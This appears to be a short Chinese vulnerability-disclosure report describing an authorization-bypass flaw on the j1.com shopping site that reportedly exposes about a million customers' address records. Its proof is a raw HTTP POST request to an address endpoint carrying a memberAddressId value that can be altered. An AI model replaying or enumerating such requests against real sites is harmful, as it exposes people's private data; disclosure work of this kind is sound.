wybug_title: 华润健一网一处越权漏洞泄露百万信息
wybug_detail:

确认收货信息时候抓包   漏洞证明：  
POST /myec/addressPartTwo.html HTTP/1.1Host: www.j1.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.j1.com/myec/confirm.htmlContent-Length: 23Cookie: Connection: keep-alivePragma: no-cacheCache-Control: no-cachememberAddressId=1042921
